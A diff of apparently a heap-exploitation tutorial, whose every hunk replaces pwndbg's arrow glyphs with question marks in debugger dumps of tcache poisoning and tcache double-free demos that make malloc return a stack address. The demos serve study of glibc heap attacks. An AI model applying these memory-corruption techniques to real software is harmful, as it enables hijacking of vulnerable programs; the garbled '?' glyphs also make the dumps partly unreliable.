@@ -316,17 +316,17 @@ pwndbg>
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 ......
- RDI  0x555555756260 ◂— 0x0
+ RDI  0x555555756260 ?— 0x0
 ......
- RIP  0x555555554815 (main+187) ◂— call   0x555555554600
+ RIP  0x555555554815 (main+187) ?— call   0x555555554600
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ......
- ► 0x555555554815 <main+187>    call   free@plt <0x555555554600>
-        ptr: 0x555555756260 ◂— 0x0
+ ? 0x555555554815 <main+187>    call   free@plt <0x555555554600>
+        ptr: 0x555555756260 ?— 0x0
 ......
 ────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
 ......
- ► 18 	free(a);
+ ? 18 	free(a);
 ......
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
 ......
@@ -339,18 +339,18 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  RCX  0x7
  RDX  0x0
  RDI  0x1
- RSI  0x555555756010 ◂— 0x100000000000000
+ RSI  0x555555756010 ?— 0x100000000000000
  R8   0x0
- R9   0x7fffffffb78c ◂— 0x1c00000000
+ R9   0x7fffffffb78c ?— 0x1c00000000
  R10  0x911
- R11  0x7ffff7aa0ba0 (free) ◂— push   rbx
- R12  0x555555554650 (_start) ◂— xor    ebp, ebp
- R13  0x7fffffffe0a0 ◂— 0x1
+ R11  0x7ffff7aa0ba0 (free) ?— push   rbx
+ R12  0x555555554650 (_start) ?— xor    ebp, ebp
+ R13  0x7fffffffe0a0 ?— 0x1
  R14  0x0
  R15  0x0
- RBP  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RSP  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RIP  0x55555555481a (main+192) ◂— mov    rax, qword ptr [rip + 0x20083f]
+ RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RIP  0x55555555481a (main+192) ?— mov    rax, qword ptr [rip + 0x20083f]
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
    0x555555554802 <main+168>    lea    rdi, [rip + 0x2bd]
    0x555555554809 <main+175>    call   fwrite@plt <0x555555554630>
@@ -359,7 +359,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554812 <main+184>    mov    rdi, rax
    0x555555554815 <main+187>    call   free@plt <0x555555554600>
  
- ► 0x55555555481a <main+192>    mov    rax, qword ptr [rip + 0x20083f] <0x555555755060>
+ ? 0x55555555481a <main+192>    mov    rax, qword ptr [rip + 0x20083f] <0x555555755060>
    0x555555554821 <main+199>    mov    rdx, qword ptr [rbp - 8]
    0x555555554825 <main+203>    lea    rsi, [rip + 0x2b4]
    0x55555555482c <main+210>    mov    rdi, rax
@@ -371,21 +371,21 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    17 	fprintf(stderr, "Freeing the buffer...\n");
    18 	free(a);
    19 
- ► 20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
+ ? 20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
    21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
    22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
    23 	a[0] = (intptr_t)&stack_var;
    24 
    25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
-00:0000│ rsp  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-01:0008│      0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-02:0010│      0x7fffffffdfb0 —▸ 0x7fffffffe0a0 ◂— 0x1
-03:0018│      0x7fffffffdfb8 —▸ 0x555555756260 ◂— 0x0
-04:0020│ rbp  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-05:0028│      0x7fffffffdfc8 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
-06:0030│      0x7fffffffdfd0 ◂— 0x0
-07:0038│      0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3c6 ◂— 0x346d2f656d6f682f ('/home/m4')
+00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
+03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
+04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
+06:0030│      0x7fffffffdfd0 ?— 0x0
+07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
 pwndbg> heapinfo
 3886144
 (0x20)     fastbin[0]: 0x0
@@ -423,22 +423,22 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  RAX  0x85
  RBX  0x0
  RCX  0x0
- RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ◂— 0x0
+ RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
  RDI  0x0
- RSI  0x7fffffffb900 ◂— 0x777265766f206557 ('We overw')
- R8   0x7ffff7fd14c0 ◂— 0x7ffff7fd14c0
- R9   0x7fffffffb78c ◂— 0x8500000000
+ RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
+ R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
+ R9   0x7fffffffb78c ?— 0x8500000000
  R10  0x0
  R11  0x246
- R12  0x555555554650 (_start) ◂— xor    ebp, ebp
- R13  0x7fffffffe0a0 ◂— 0x1
+ R12  0x555555554650 (_start) ?— xor    ebp, ebp
+ R13  0x7fffffffe0a0 ?— 0x1
  R14  0x0
  R15  0x0
- RBP  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RSP  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RIP  0x555555554867 (main+269) ◂— lea    rdx, [rbp - 0x18]
+ RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RIP  0x555555554867 (main+269) ?— lea    rdx, [rbp - 0x18]
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
- ► 0x555555554867 <main+269>    lea    rdx, [rbp - 0x18] <0x7ffff7dd48b0>
+ ? 0x555555554867 <main+269>    lea    rdx, [rbp - 0x18] <0x7ffff7dd48b0>
    0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
    0x55555555486f <main+277>    mov    qword ptr [rax], rdx
    0x555555554872 <main+280>    mov    edi, 0x80
@@ -456,21 +456,21 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
    21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
    22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
- ► 23 	a[0] = (intptr_t)&stack_var;
+ ? 23 	a[0] = (intptr_t)&stack_var;
    24 
    25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
    26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
    27 
    28 	intptr_t *b = malloc(128);
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
-00:0000│ rsp  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-01:0008│      0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-02:0010│      0x7fffffffdfb0 —▸ 0x7fffffffe0a0 ◂— 0x1
-03:0018│      0x7fffffffdfb8 —▸ 0x555555756260 ◂— 0x0
-04:0020│ rbp  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-05:0028│      0x7fffffffdfc8 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
-06:0030│      0x7fffffffdfd0 ◂— 0x0
-07:0038│      0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3c6 ◂— 0x346d2f656d6f682f ('/home/m4')
+00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
+03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
+04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
+06:0030│      0x7fffffffdfd0 ?— 0x0
+07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
 pwndbg> heapinfo
 3886144
 (0x20)     fastbin[0]: 0x0
@@ -491,28 +491,28 @@ pwndbg> n
 25		fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
- RAX  0x555555756260 —▸ 0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
+ RAX  0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
  RBX  0x0
  RCX  0x0
- RDX  0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
+ RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
  RDI  0x0
- RSI  0x7fffffffb900 ◂— 0x777265766f206557 ('We overw')
- R8   0x7ffff7fd14c0 ◂— 0x7ffff7fd14c0
- R9   0x7fffffffb78c ◂— 0x8500000000
+ RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
+ R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
+ R9   0x7fffffffb78c ?— 0x8500000000
  R10  0x0
  R11  0x246
- R12  0x555555554650 (_start) ◂— xor    ebp, ebp
- R13  0x7fffffffe0a0 ◂— 0x1
+ R12  0x555555554650 (_start) ?— xor    ebp, ebp
+ R13  0x7fffffffe0a0 ?— 0x1
  R14  0x0
  R15  0x0
- RBP  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RSP  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RIP  0x555555554872 (main+280) ◂— mov    edi, 0x80
+ RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RIP  0x555555554872 (main+280) ?— mov    edi, 0x80
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
    0x555555554867 <main+269>    lea    rdx, [rbp - 0x18]
    0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
    0x55555555486f <main+277>    mov    qword ptr [rax], rdx
- ► 0x555555554872 <main+280>    mov    edi, 0x80
+ ? 0x555555554872 <main+280>    mov    edi, 0x80
    0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
  
    0x55555555487c <main+290>    mov    rdx, rax
@@ -527,21 +527,21 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
    23 	a[0] = (intptr_t)&stack_var;
    24 
- ► 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
+ ? 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
    26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
    27 
    28 	intptr_t *b = malloc(128);
    29 	fprintf(stderr, "2st malloc(128): %p\n", b);
    30 	fprintf(stderr, "We got the control\n");
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
-00:0000│ rsp  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-01:0008│ rdx  0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-02:0010│      0x7fffffffdfb0 —▸ 0x7fffffffe0a0 ◂— 0x1
-03:0018│      0x7fffffffdfb8 —▸ 0x555555756260 —▸ 0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-04:0020│ rbp  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-05:0028│      0x7fffffffdfc8 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
-06:0030│      0x7fffffffdfd0 ◂— 0x0
-07:0038│      0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3c6 ◂— 0x346d2f656d6f682f ('/home/m4')
+00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+01:0008│ rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
+03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
+06:0030│      0x7fffffffdfd0 ?— 0x0
+07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
 pwndbg> heapinfo
 3886144
 (0x20)     fastbin[0]: 0x0
@@ -571,20 +571,20 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  RAX  0x20
  RBX  0x0
  RCX  0x0
- RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ◂— 0x0
+ RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
  RDI  0x0
- RSI  0x7fffffffb900 ◂— 0x6c6c616d20747331 ('1st mall')
- R8   0x7ffff7fd14c0 ◂— 0x7ffff7fd14c0
- R9   0x7fffffffb78c ◂— 0x2000000000
+ RSI  0x7fffffffb900 ?— 0x6c6c616d20747331 ('1st mall')
+ R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
+ R9   0x7fffffffb78c ?— 0x2000000000
  R10  0x0
  R11  0x246
- R12  0x555555554650 (_start) ◂— xor    ebp, ebp
- R13  0x7fffffffe0a0 ◂— 0x1
+ R12  0x555555554650 (_start) ?— xor    ebp, ebp
+ R13  0x7fffffffe0a0 ?— 0x1
  R14  0x0
  R15  0x0
- RBP  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RSP  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RIP  0x55555555489a (main+320) ◂— mov    rax, qword ptr [rip + 0x2007bf]
+ RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RIP  0x55555555489a (main+320) ?— mov    rax, qword ptr [rip + 0x2007bf]
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
    0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
    0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
@@ -592,7 +592,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554890 <main+310>    mov    eax, 0
    0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
  
- ► 0x55555555489a <main+320>    mov    rax, qword ptr [rip + 0x2007bf] <0x555555755060>
+ ? 0x55555555489a <main+320>    mov    rax, qword ptr [rip + 0x2007bf] <0x555555755060>
    0x5555555548a1 <main+327>    lea    rdx, [rbp - 0x18]
    0x5555555548a5 <main+331>    lea    rsi, [rip + 0x234]
    0x5555555548ac <main+338>    mov    rdi, rax
@@ -604,21 +604,21 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    23 	a[0] = (intptr_t)&stack_var;
    24 
    25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
- ► 26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
+ ? 26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
    27 
    28 	intptr_t *b = malloc(128);
    29 	fprintf(stderr, "2st malloc(128): %p\n", b);
    30 	fprintf(stderr, "We got the control\n");
    31 
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
-00:0000│ rsp  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-01:0008│      0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-02:0010│      0x7fffffffdfb0 —▸ 0x7fffffffe0a0 ◂— 0x1
-03:0018│      0x7fffffffdfb8 —▸ 0x555555756260 —▸ 0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-04:0020│ rbp  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-05:0028│      0x7fffffffdfc8 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
-06:0030│      0x7fffffffdfd0 ◂— 0x0
-07:0038│      0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3c6 ◂— 0x346d2f656d6f682f ('/home/m4')
+00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
+03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
+06:0030│      0x7fffffffdfd0 ?— 0x0
+07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
 pwndbg> heapinfo
 3886144
 (0x20)     fastbin[0]: 0x0
@@ -659,23 +659,23 @@ pwndbg> ni
 0x00005555555548c3	28		intptr_t *b = malloc(128);
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
- RAX  0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
+ RAX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
  RBX  0x0
- RCX  0x555555756010 ◂— 0xff00000000000000
- RDX  0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
- RDI  0x555555554650 (_start) ◂— xor    ebp, ebp
- RSI  0x555555756048 ◂— 0x0
- R8   0x7ffff7fd14c0 ◂— 0x7ffff7fd14c0
- R9   0x7fffffffb78c ◂— 0x2c00000000
+ RCX  0x555555756010 ?— 0xff00000000000000
+ RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+ RDI  0x555555554650 (_start) ?— xor    ebp, ebp
+ RSI  0x555555756048 ?— 0x0
+ R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
+ R9   0x7fffffffb78c ?— 0x2c00000000
  R10  0x0
  R11  0x246
- R12  0x555555554650 (_start) ◂— xor    ebp, ebp
- R13  0x7fffffffe0a0 ◂— 0x1
+ R12  0x555555554650 (_start) ?— xor    ebp, ebp
+ R13  0x7fffffffe0a0 ?— 0x1
  R14  0x0
  R15  0x0
- RBP  0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RSP  0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
- RIP  0x5555555548c3 (main+361) ◂— mov    qword ptr [rbp - 0x10], rax
+ RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+ RIP  0x5555555548c3 (main+361) ?— mov    qword ptr [rbp - 0x10], rax
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
    0x5555555548ac <main+338>    mov    rdi, rax
    0x5555555548af <main+341>    mov    eax, 0
@@ -684,7 +684,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x5555555548b9 <main+351>    mov    edi, 0x80
    0x5555555548be <main+356>    call   malloc@plt <0x555555554620>
  
- ► 0x5555555548c3 <main+361>    mov    qword ptr [rbp - 0x10], rax
+ ? 0x5555555548c3 <main+361>    mov    qword ptr [rbp - 0x10], rax
    0x5555555548c7 <main+365>    mov    rax, qword ptr [rip + 0x200792] <0x555555755060>
    0x5555555548ce <main+372>    mov    rdx, qword ptr [rbp - 0x10]
    0x5555555548d2 <main+376>    lea    rsi, [rip + 0x2b4]
@@ -696,21 +696,21 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
    26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
    27 
- ► 28 	intptr_t *b = malloc(128);
+ ? 28 	intptr_t *b = malloc(128);
    29 	fprintf(stderr, "2st malloc(128): %p\n", b);
    30 	fprintf(stderr, "We got the control\n");
    31 
    32 	return 0;
    33 }
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
-00:0000│ rsp      0x7fffffffdfa0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-01:0008│ rax rdx  0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-02:0010│          0x7fffffffdfb0 —▸ 0x7fffffffe0a0 ◂— 0x1
-03:0018│          0x7fffffffdfb8 —▸ 0x555555756260 —▸ 0x7fffffffdfa8 —▸ 0x555555554650 (_start) ◂— xor    ebp, ebp
-04:0020│ rbp      0x7fffffffdfc0 —▸ 0x555555554910 (__libc_csu_init) ◂— push   r15
-05:0028│          0x7fffffffdfc8 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
-06:0030│          0x7fffffffdfd0 ◂— 0x0
-07:0038│          0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3c6 ◂— 0x346d2f656d6f682f ('/home/m4')
+00:0000│ rsp      0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+01:0008│ rax rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+02:0010│          0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
+03:0018│          0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
+04:0020│ rbp      0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
+05:0028│          0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
+06:0030│          0x7fffffffdfd0 ?— 0x0
+07:0038│          0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
 pwndbg> i r rax
 rax            0x7fffffffdfa8	140737488347048
 ```
@@ -775,18 +775,18 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  RCX  0x0
  RDX  0x0
  RDI  0x1
- RSI  0x555555756010 ◂— 0x1
+ RSI  0x555555756010 ?— 0x1
  R8   0x0
- R9   0x7fffffffb79c ◂— 0x1a00000000
+ R9   0x7fffffffb79c ?— 0x1a00000000
  R10  0x911
- R11  0x7ffff7aa0ba0 (free) ◂— push   rbx
- R12  0x555555554650 (_start) ◂— xor    ebp, ebp
- R13  0x7fffffffe0b0 ◂— 0x1
+ R11  0x7ffff7aa0ba0 (free) ?— push   rbx
+ R12  0x555555554650 (_start) ?— xor    ebp, ebp
+ R13  0x7fffffffe0b0 ?— 0x1
  R14  0x0
  R15  0x0
- RBP  0x7fffffffdfd0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
- RSP  0x7fffffffdfb0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
- RIP  0x5555555547fc (main+162) ◂— mov    rax, qword ptr [rbp - 0x18]
+ RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
+ RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
+ RIP  0x5555555547fc (main+162) ?— mov    rax, qword ptr [rbp - 0x18]
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
    0x5555555547e4 <main+138>    lea    rdi, [rip + 0x171]
    0x5555555547eb <main+145>    call   fwrite@plt <0x555555554630>
@@ -795,7 +795,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x5555555547f4 <main+154>    mov    rdi, rax
    0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
  
- ► 0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
+ ? 0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
    0x555555554800 <main+166>    mov    rdi, rax
    0x555555554803 <main+169>    call   free@plt <0x555555554600>
  
@@ -808,21 +808,21 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    11 	fprintf(stderr, "malloc(8): %p\n", a);
    12 	fprintf(stderr, "Freeing twice...\n");
    13 	free(a);
- ► 14 	free(a);
+ ? 14 	free(a);
    15 
    16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
    17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
    18 
    19 	return 0;
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
-00:0000│ rsp  0x7fffffffdfb0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
-01:0008│      0x7fffffffdfb8 —▸ 0x555555756260 ◂— 0x0
-02:0010│      0x7fffffffdfc0 —▸ 0x7fffffffe0b0 ◂— 0x1
-03:0018│      0x7fffffffdfc8 ◂— 0x0
-04:0020│ rbp  0x7fffffffdfd0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
-05:0028│      0x7fffffffdfd8 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
-06:0030│      0x7fffffffdfe0 ◂— 0x0
-07:0038│      0x7fffffffdfe8 —▸ 0x7fffffffe0b8 —▸ 0x7fffffffe3d8 ◂— 0x346d2f656d6f682f ('/home/m4')
+00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
+01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
+02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
+03:0018│      0x7fffffffdfc8 ?— 0x0
+04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
+05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
+06:0030│      0x7fffffffdfe0 ?— 0x0
+07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
 pwndbg> heapinfo
 3886144
 (0x20)     fastbin[0]: 0x0
@@ -851,20 +851,20 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  RAX  0x0
  RBX  0x0
  RCX  0x0
- RDX  0x555555756260 ◂— 0x555555756260 /* '`buUUU' */
+ RDX  0x555555756260 ?— 0x555555756260 /* '`buUUU' */
  RDI  0x2
- RSI  0x555555756010 ◂— 0x2
+ RSI  0x555555756010 ?— 0x2
  R8   0x1
- R9   0x7fffffffb79c ◂— 0x1a00000000
+ R9   0x7fffffffb79c ?— 0x1a00000000
  R10  0x911
- R11  0x7ffff7aa0ba0 (free) ◂— push   rbx
- R12  0x555555554650 (_start) ◂— xor    ebp, ebp
- R13  0x7fffffffe0b0 ◂— 0x1
+ R11  0x7ffff7aa0ba0 (free) ?— push   rbx
+ R12  0x555555554650 (_start) ?— xor    ebp, ebp
+ R13  0x7fffffffe0b0 ?— 0x1
  R14  0x0
  R15  0x0
- RBP  0x7fffffffdfd0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
- RSP  0x7fffffffdfb0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
- RIP  0x555555554808 (main+174) ◂— mov    rax, qword ptr [rip + 0x200851]
+ RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
